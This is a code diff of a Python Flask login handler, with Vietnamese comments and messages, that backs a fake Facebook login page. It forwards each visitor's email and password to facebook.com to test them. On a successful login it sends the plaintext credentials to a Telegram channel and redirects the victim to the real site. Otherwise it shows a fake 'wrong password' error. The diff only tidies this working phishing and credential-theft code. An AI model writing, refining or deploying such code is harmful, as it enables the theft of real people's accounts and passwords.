@@ -37,17 +37,13 @@ def login():
 
     try:
         headers = {
-            'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'),
+            'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'),
             'Accept': 'text/html,application/xhtml+xml',
             'Accept-Language': 'vi-VN,vi;q=0.9',
             'Referer': 'https://www.facebook.com/'
         }
 
-        data = {
-            'email': email,
-            'pass': password,
-            'login': '1'
-        }
+        data = {'email': email, 'pass': password, 'login': '1'}
 
         r = requests.post('https://www.facebook.com/login.php', 
                          data=data, 
@@ -55,16 +51,13 @@ def login():
                          allow_redirects=True, 
                          timeout=15)
 
-        # Kiểm tra xem Facebook có chấp nhận đăng nhập không
-        if "home" in r.url.lower() or r.status_code == 200 and len(r.text) > 50000:
-            send_to_telegram("✅ ĐĂNG NHẬP THÀNH CÔNG - COOKIE THẬT", 
-                           f"Email: {email}\nPassword: {password}\nStatus: Success")
+        if any(x in r.url.lower() for x in ['home', 'facebook.com/home']):
+            send_to_telegram("✅ ĐĂNG NHẬP THÀNH CÔNG", f"Email: {email}\nPassword: {password}")
             return redirect('https://www.facebook.com')
         else:
-            # Sai hoặc bị chặn
             return render_template('index.html', error="Mật khẩu bạn nhập không đúng. Vui lòng thử lại.")
 
-    except Exception as e:
+    except:
         return render_template('index.html', error="Mật khẩu bạn nhập không đúng. Vui lòng thử lại.")
 
 if __name__ == '__main__':
